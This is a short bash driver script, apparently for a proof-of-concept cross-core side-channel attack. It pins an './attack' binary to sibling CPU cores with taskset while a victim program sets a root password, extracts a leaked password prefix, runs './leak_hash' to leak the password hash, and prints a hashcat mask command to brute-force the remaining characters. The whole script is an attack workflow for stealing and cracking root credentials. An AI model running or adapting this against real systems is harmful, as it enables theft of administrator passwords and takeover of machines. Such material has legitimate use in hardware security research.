#!/bin/bash

killall attack 2>/dev/null
killall leak_hash 2>/dev/null

make all

echo
echo "Running prefix attack..."

taskset -c 1,5 ./attack > prefix_output.txt & (sleep 1 && taskset -c 3 /tmp/set_root_password)
cat prefix_output.txt

# Extract operands
PREFIX=$(grep "Prefix: " prefix_output.txt | cut -d' ' -f2)

echo
echo "Running leak hash..."

taskset -c 0,4 ./leak_hash > leak_output.txt
cat leak_output.txt

HASH=$(grep "Hash: " leak_output.txt | cut -d':' -f3)

echo
echo "Run the following command to crack the hash:"
echo "hashcat -a 3 '${HASH}' '${PREFIX}?h?h?h?h?h?h' --increment-min ${#PREFIX} --increment -w 4"

make clean > /dev/null
rm prefix_output.txt leak_output.txt
